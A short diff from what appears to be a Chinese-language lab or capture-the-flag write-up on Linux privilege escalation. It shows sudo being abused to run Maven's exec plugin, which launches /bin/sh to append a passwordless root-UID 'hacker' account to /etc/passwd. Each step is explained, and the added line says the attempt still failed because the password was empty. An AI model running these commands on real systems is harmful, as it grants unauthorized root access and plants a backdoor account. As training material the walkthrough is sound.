@@ -667,8 +667,10 @@ uid=1002(terra536) gid=1002(terra536) groups=1002(terra536)
 ```bash
 bash-5.2# echo 'hacker::0:0:root:/root:/bin/bash' > /tmp/newpasswd
 bash-5.2# sudo /usr/bin/mvn exec:exec -Dexec.executable=/bin/sh -Dexec.args="-c 'cat /tmp/newpasswd >> /etc/passwd'"
+
 ```
 - root 运行 `/usr/bin/mvn`
 - maven 执行 `/bin/sh`
 - `sh` 执行 `cat /tmp/newpasswd >> /etc/passwd`
 - root 往 `/etc/passwd` 里添加了一行`hacker::0:0:root:/root:/bin/bash`
+但是这里还是失败了，原因是我们设置的是空密码
